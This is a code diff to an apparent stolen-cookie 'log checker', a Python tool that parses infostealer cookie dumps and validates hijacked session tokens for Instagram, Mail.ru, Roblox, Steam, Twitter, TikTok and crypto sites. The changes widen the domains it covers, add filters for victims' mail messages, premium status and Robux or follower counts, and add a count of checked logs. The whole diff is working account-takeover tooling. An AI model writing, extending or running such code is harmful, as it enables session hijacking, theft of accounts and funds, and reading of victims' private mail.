@@ -158,7 +158,7 @@ class headless(object):
         'Instagram': {'domain': ['.instagram.com', 'instagram.com', 'www.instagram.com'], 'name': ['sessionid']},
         'Kryptex': {'domain': ['.kryptex.org', 'www.kryptex.org', 'kryptex.org'], 'name': ['sessionid']},
         'Mail': {'domain': ['.e.mail.ru','.calls.mail.ru','.mail.ru', 'mail.ru', 'cloud.mail.ru', 'mail.google.com', '.account.mail.ru','account.mail.ru'], 'name': ['Mpop','sdcs']},
-        'PornoHub': {'domain': ['.pornhub.org', 'pornhub.org', 'www.pornhub.com'], 'name': ['il']},
+        'PornoHub': {'domain': ['.pornhub.org', 'pornhub.org', 'www.pornhub.com', '.pornhubpremium.com', 'hubt.pornhub.com', '.pornhub.com'], 'name': ['il']},
         'Roblox': {'domain': ['.roblox.com', 'www.roblox.com'], 'name': ['.ROBLOSECURITY']},
         'Steam': {'domain': ['store.steampowered.com', '.steampowered.com', 'help.steampowered.com', 'steampowered.com', '.steamcommunity.com', 'steamcommunity.com'], 'name': ['steamLoginSecure']},
         'Twitter': {'domain': ['.twitter.com', 'twitter.com'], 'name': ['auth_token']},
@@ -209,6 +209,12 @@ class headless(object):
                         'TikTok': 1,
                     },
                     'Filter_settings': {
+                        'Mail':{
+                            'Full_log': "!Full_log",
+                            'Msg_path': '!Msg',
+                            "Detailed_Information": 0,
+                            'Filter_msg': ["noreply@steampowered.com", "Porno"]
+                        },
                         'Crex24': {
                             'Full_log': "!Full_log",
                             'Balanc_path': '!Balanc',
@@ -246,7 +252,9 @@ class headless(object):
                             'Robux_path': '!Robux',
                             'Filter_robux': '40',
                             'Followers_path': '!Followers',
-                            'Filter_followers': '100'
+                            'Filter_followers': '100',
+                            "Premium_path": "!Premium",
+                            'Filter_premium': 'True'
                         },
                         'Twitter': {
                             'Full_log': '!Full_log',
@@ -282,6 +290,7 @@ class headless(object):
             return json.load(outfile)
 
 class start_work():
+    count_checked_log = 0
     headless.create_default_file()
     settings_services = headless.settings_services
     settings = headless.get_settings()
@@ -413,6 +422,7 @@ class start_work():
                 if local_line[0] in start_work.settings_services['FreeBitco']['domain']:
                     if local_line[-2] in start_work.settings_services['FreeBitco']['name']:
                         local_freebitco[local_line[-2]] = local_line[-1]
+                        print(local_line)
             if len(local_freebitco) == len(start_work.settings_services['FreeBitco']['name']):
                 freebitco_cookie.append(local_freebitco)
                 local_freebitco = {}
@@ -494,7 +504,7 @@ class start_work():
                 if mail_cookie:
                     mail_cook = random.choice(mail_cookie)
                     mail_cookie.remove(mail_cook)
-                    mail_ru_checker.checker('Mail', mail_cook, log)
+                    mail_ru_checker.checker('Mail', mail_cook, log, cls.settings['File_scan'])
                     counter_stop += 1
 
             if cls.allow_services['PornoHub']:
@@ -544,10 +554,9 @@ class start_work():
                     tiktok_checker.checker('TikTok', tiktok_cook, log, cls.settings['File_scan'])
                 if len(tiktok_cookie) == 0:
                     counter_stop += 1
-
             if counter_stop >= stop:
+                cls.count_checked_log += 1
                 changer_log = True
-
             time.sleep(1)
 
 if __name__ == '__main__':
